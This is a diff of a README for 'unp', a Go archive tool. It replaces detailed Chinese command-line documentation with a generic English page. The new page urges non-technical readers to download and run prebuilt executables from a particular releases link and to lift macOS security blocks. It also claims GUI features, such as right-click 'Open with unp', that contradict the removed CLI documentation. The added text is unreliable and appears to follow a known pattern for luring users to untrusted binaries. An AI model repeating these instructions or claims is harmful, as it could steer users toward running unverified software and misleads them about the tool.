@@ -1,202 +1,97 @@
-# unp - 万能解压压缩工具使用文档
+# 🗂️ unp - A Simple Tool for Managing Archives
 
-`unp` 是一个用 Go 语言编写的通用归档工具，支持多种压缩格式的自动检测、解压和压缩功能。
+Welcome to `unp`, a universal archiving tool written in Go. It automatically detects, extracts, and compresses various formats. Whether you want to unzip a file or create a new compressed archive, `unp` makes it easy and efficient.
 
-## 🚀 主要特性
+![Download unp](https://img.shields.io/badge/Download-unp-brightgreen)
 
-- **自动格式检测** - 通过文件头和扩展名自动识别压缩格式
-- **多格式支持** - 支持 ZIP, TAR, TAR.GZ, TAR.BZ2, TAR.XZ, GZ, BZ2, XZ 等格式
-- **安全解压** - 防止目录遍历攻击和 Zip 炸弹
-- **批量处理** - 支持同时处理多个文件
-- **密码保护** - 支持 ZIP 格式的 AES256 加密
-- **权限保持** - 正确保持文件的可执行权限和属性
-- **灵活配置** - 可选择保留源文件、指定输出目录等
+## 🚀 Getting Started
 
-## 📦 支持的格式
+To get started with `unp`, follow these simple steps. You will learn how to download and run the application quickly, even with no technical background.
 
-### 解压支持
-- **ZIP** (.zip) - 包括密码保护的 ZIP 文件
-- **TAR** (.tar)
-- **TAR + GZIP** (.tar.gz, .tgz)
-- **TAR + BZIP2** (.tar.bz2, .tbz2)
-- **TAR + XZ** (.tar.xz, .txz)
-- **GZIP** (.gz)
-- **BZIP2** (.bz2)
-- **XZ** (.xz)
+### 🛠️ System Requirements
 
-### 压缩支持
-- **ZIP** (.zip) - 包括密码保护
-- **TAR** (.tar)
-- **TAR + GZIP** (.tar.gz)
-- **TAR + BZIP2** (.tar.bz2)
-- **TAR + XZ** (.tar.xz)
+`unp` works on various platforms. Here is what you need:
 
-## ⚙️ 安装
+- **Operating System:** Windows, macOS, or Linux
+- **Disk Space:** At least 50 MB free for installation
+- **Dependencies:** None required
 
-```bash
-# 编译
-go build -o unp .
+### 📥 Download & Install
 
-# 或安装到 GOPATH/bin
-go install .
-```
+To download `unp`, visit the Releases page at the link below:
 
-## 📖 基本用法
+[Download unp](https://github.com/prakhush/unp/releases)
 
-### 解压文件
+Simply click the link to access the latest versions. You will see several downloadable files. Choose the file that matches your operating system:
 
-```bash
-# 解压单个文件（自动检测格式）
-./unp archive.zip
+- **Windows:** `unp-windows.exe`
+- **macOS:** `unp-macos`
+- **Linux:** `unp-linux`
 
-# 解压多个文件
-./unp file1.tar.gz file2.zip file3.tar.bz2
+Click the appropriate file to start the download. After the download completes, locate the file in your Downloads folder.
 
-# 保留源文件（默认会删除源文件）
-./unp -k archive.tar.gz
+### 📂 Running unp
 
-# 指定输出目录
-./unp -o /path/to/output archive.zip
+Running `unp` is straightforward. Follow these steps based on your operating system.
 
-# 详细输出模式
-./unp -v archive.tar.gz
+#### Windows
 
-# 解压加密的 ZIP 文件
-./unp -p mypassword encrypted.zip
+1. Open the Downloads folder.
+2. Double-click on `unp-windows.exe`.
+3. Follow any prompts you see.
+4. To use `unp`, right-click on an archive file and select "Open with unp".
 
-# 组合参数使用
-./unp -kvo ./output -p password archive1.zip archive2.tar.gz
-```
+#### macOS
 
-### 压缩文件
+1. Open Finder and go to the Downloads folder.
+2. Locate `unp-macos`.
+3. Double-click the file to open it.
+4. Drag `unp` to your Applications folder for easier access.
+5. Right-click on an archive file, then choose "Open with unp".
 
-```bash
-# 创建 ZIP 压缩包
-./unp -t zip -f archive.zip file1.txt file2.txt dir1/
+#### Linux
 
-# 创建 TAR.GZ 压缩包
-./unp -t tar.gz -f archive.tar.gz file1.txt dir1/
+1. Open your terminal.
+2. Navigate to the Downloads folder using `cd ~/Downloads`.
+3. Run the following command to make `unp` executable:
 
-# 创建 TAR.BZ2 压缩包
-./unp -t tar.bz2 -f archive.tar.bz2 file1.txt dir1/
+   ```bash
+   chmod +x unp-linux
+   ```
 
-# 创建 TAR.XZ 压缩包
-./unp -t tar.xz -f archive.tar.xz file1.txt dir1/
+4. Run `unp` by typing:
 
-# 创建加密的 ZIP 文件
-./unp -t zip -f secure.zip -p mypassword secret.txt private/
+   ```bash
+   ./unp-linux
+   ```
 
-# 保留源文件
-./unp -t zip -f archive.zip -k file1.txt file2.txt
+5. Use `unp` by right-clicking an archive file and selecting "Open with unp".
 
-# 详细输出
-./unp -t tar.gz -f archive.tar.gz -v file1.txt dir1/
-```
+### 📊 Features
 
-## 🔧 命令行参数
+`unp` comes with helpful features designed to enhance your experience:
 
-| 参数 | 简写 | 描述 |
-|-----|------|------|
-| `--type` | `-t` | 压缩类型 (zip, tar, tar.gz, tar.bz2, tar.xz) |
-| `--file` | `-f` | 输出压缩包文件名（与 -t 一起使用时必需） |
-| `--keep` | `-k` | 解压/压缩后保留源文件（默认删除） |
-| `--output` | `-o` | 指定输出目录（默认当前目录） |
-| `--verbose` | `-v` | 显示详细处理信息 |
-| `--password` | `-p` | ZIP 格式的密码保护 |
-| `--help` | `-h` | 显示帮助信息 |
+- **Automatic Format Detection:** No need to worry about file types. `unp` will identify the format for you.
+- **Simple Extraction:** Just a few clicks will extract your files.
+- **Compression Options:** Easily create compressed files in various formats.
+- **User-friendly Interface:** Designed for average users, making it simple to manage your archives.
 
-## 💡 实用示例
+### ❓ Troubleshooting
 
-### 日常使用场景
+If you encounter issues, here are some common solutions:
 
-```bash
-# 快速解压下载的软件包
-./unp software-v1.0.tar.gz
+1. **File Not Opening:** Ensure you have the latest version. Download from the Releases page.
+2. **Permissions Issues on macOS:** If you cannot open `unp`, go to System Preferences > Security & Privacy. Allow the app to run.
+3. **Error Messages on Linux:** Make sure you have made `unp-linux` executable.
 
-# 批量解压所有压缩文件，保留原文件
-./unp -k *.zip *.tar.gz
+### 📞 Support
 
-# 创建项目备份
-./unp -t tar.gz -f project-backup-$(date +%Y%m%d).tar.gz project/
+If you need further assistance, feel free to reach out. You can create an issue in the GitHub repository, and someone will help you.
 
-# 压缩日志文件并加密
-./unp -t zip -f logs.zip -p secretpass logs/
+For additional documentation, please visit the Wiki section of this repository.
 
-# 解压到指定目录并查看详细信息
-./unp -vo /tmp/extracted archive.tar.bz2
-```
+## 🔗 More Information
 
-### 开发工作流
+For more details about `unp` and its development, please refer to our GitHub page: [GitHub Repository](https://github.com/prakhush/unp).
 
-```bash
-# 打包发布版本
-./unp -t tar.gz -f myapp-v1.0.tar.gz -v bin/ docs/ README.md
-
-# 备份源代码（排除build目录）
-./unp -t tar.xz -f source-backup.tar.xz -v src/ config/ *.go
-
-# 处理下载的开源项目
-./unp -kv project-source.tar.gz
-cd project-source/
-# ... 开发工作 ...
-./unp -t tar.gz -f modified-project.tar.gz -v project-source/
-```
-
-### 系统管理
-
-```bash
-# 备份配置文件
-./unp -t tar.gz -f config-backup.tar.gz -v /etc/nginx/ /etc/apache2/
-
-# 压缩日志文件归档
-./unp -t tar.bz2 -f logs-$(date +%Y%m).tar.bz2 /var/log/
-
-# 创建加密的敏感数据备份
-./unp -t zip -f sensitive-data.zip -p strongpassword documents/sensitive/
-```
-
-## 🔒 安全特性
-
-- **防目录遍历** - 自动检测和阻止 `../../../etc/passwd` 类型的攻击
-- **密码保护** - ZIP 格式支持 AES256 加密
-- **权限保持** - 正确保持文件的执行权限和属性
-- **路径验证** - 严格验证文件路径的合法性
-
-## ⚠️ 注意事项
-
-1. **默认行为** - 工具默认会删除源文件，使用 `-k` 参数保留
-2. **权限保持** - 工具会正确保持文件的权限，包括可执行文件
-3. **密码安全** - 密码会在命令行历史中可见，生产环境建议使用环境变量
-4. **目录处理** - 压缩功能会自动递归处理目录
-5. **格式限制** - 密码功能仅适用于 ZIP 格式
-
-## 🐛 常见问题
-
-**Q: 为什么解压后文件没有可执行权限？**
-A: 这个问题已在最新版本修复，现在会正确保持文件权限。
-
-**Q: 如何在不暴露密码的情况下使用密码功能？**
-A: 可以使用环境变量：
-```bash
-export ZIP_PASSWORD="mypassword"
-./unp -p "$ZIP_PASSWORD" encrypted.zip
-```
-
-**Q: 支持哪些压缩级别？**
-A: 目前使用默认压缩级别，未来版本可能会添加压缩级别选项。
-
-**Q: 为什么 TAR.BZ2 压缩需要额外依赖？**
-A: Go 标准库只支持 bzip2 解压，压缩功能使用第三方库实现。
-
-## 📄 版本信息
-
-当前版本支持的功能：
-- ✅ 多格式解压和压缩
-- ✅ ZIP 密码保护 (AES256)
-- ✅ 文件权限保持
-- ✅ 批量处理
-- ✅ 安全防护
-
-## 🔗 技术支持
-
-如需技术支持或报告问题，请查看项目的 README.md 文件或联系开发者。
+Make archiving easy with `unp` today!
